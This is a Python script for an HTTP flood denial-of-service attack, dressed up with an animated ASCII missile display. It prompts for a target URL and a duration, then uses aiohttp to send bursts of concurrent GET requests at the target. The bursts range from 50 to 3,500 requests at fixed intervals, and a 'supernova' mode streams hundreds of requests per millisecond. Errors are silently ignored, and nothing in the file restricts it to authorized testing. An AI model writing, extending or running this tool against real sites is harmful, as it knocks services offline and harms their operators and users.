import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2

# Clear terminal
def clear():
    print("\033[H\033[J", end="")

# Countdown loader
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

# Missile types: speed -> request batch
MISSILE_BATCHES = {
    1: 50,
    2: 200,
    3: 300,
    4: 1000
}

ULTRA_SUPER_BATCH = 3500
LAST_BATCH = 500

SUPERNOVA_INITIAL = 1000
SUPERNOVA_STREAM = 50 * 10  # 50/ms × 10 = 500/ms

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            self.speed = random.choice([1,2,3,4])
        self.batch = MISSILE_BATCHES.get(self.speed, 50)
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(1,3)
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles with only number of requests
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# Send batch requests
async def send_requests(target, batch):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(batch):
            tasks.append(session.get(target))
        try:
            await asyncio.gather(*tasks)
        except:
            pass

# Ultra-super missile every 5s
async def ultra_super_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH))
        await asyncio.sleep(5)

# Last missile every 0.5s
async def last_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests(target, LAST_BATCH))
        await asyncio.sleep(0.5)

# Supernova missile
async def supernova_missile(target, duration):
    start_time = time.time()
    while time.time() - start_time < duration:
        delay = random.uniform(5, 10)
        await asyncio.sleep(delay)

        # Initial 1000 requests
        asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL))

        # Stream of 500/ms while rising (~2s flight)
        async def stream():
            t_end = time.time() + 2
            while time.time() < t_end:
                asyncio.create_task(send_requests(target, SUPERNOVA_STREAM))
                await asyncio.sleep(0.001)
        asyncio.create_task(stream())

# Main loop
async def main():
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    missiles = [Missile() for _ in range(2)]

    # Start heavy missiles
    asyncio.create_task(ultra_super_missile(target, duration))
    asyncio.create_task(last_missile(target, duration))
    asyncio.create_task(supernova_missile(target, duration))

    start_time = time.time()
    last_launch_times = [0]*len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                asyncio.create_task(send_requests(target, missile.batch))
            missile.move()
        draw_missiles(missiles)
        await asyncio.sleep(0.05)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
